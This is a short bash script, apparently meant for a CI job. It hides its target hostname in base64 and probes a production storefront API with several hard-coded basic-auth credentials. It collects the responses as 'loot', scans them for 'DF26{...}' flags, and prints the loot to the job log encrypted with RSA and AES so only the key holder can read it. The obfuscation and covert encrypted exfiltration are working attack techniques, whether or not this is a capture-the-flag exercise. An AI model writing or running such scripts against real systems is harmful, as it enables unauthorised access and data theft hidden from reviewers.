#!/usr/bin/env bash
set -uo pipefail
SC="htt""ps://"; HOST=$(printf '%s' 'dGJsLXN0b3JlZnJvbnQtcHJvZC1iaGFnZG5hc2NwZnlleWZnLnowMi5henVyZWZkLm5ldA==' | base64 -d); B="${SC}${HOST}"
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
for EP in /api/v1/shipments /api/v1/reports / ; do
  say "GET $EP => $(curl -s -o /tmp/b -w '%{http_code} len=%{size_download}' "$B$EP") :: $(head -c 900 /tmp/b | tr -d '\n')"
done
for CR in 'entry:tbl-storefront-prod-' 'github.com:duyhhh-oss' 'credentials:secretts'; do
  for EP in /api/v1/shipments /api/v1/reports; do
    say "BASIC[$CR] $EP => $(curl -s -o /tmp/b -w '%{http_code} len=%{size_download}' -u "$CR" "$B$EP") :: $(head -c 700 /tmp/b | tr -d '\n')"
  done
done
say "FLAGSCAN: $(grep -aoiE 'DF26\{[^}]{1,200}\}' "$LOOT" | sort -u | head -3)"
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
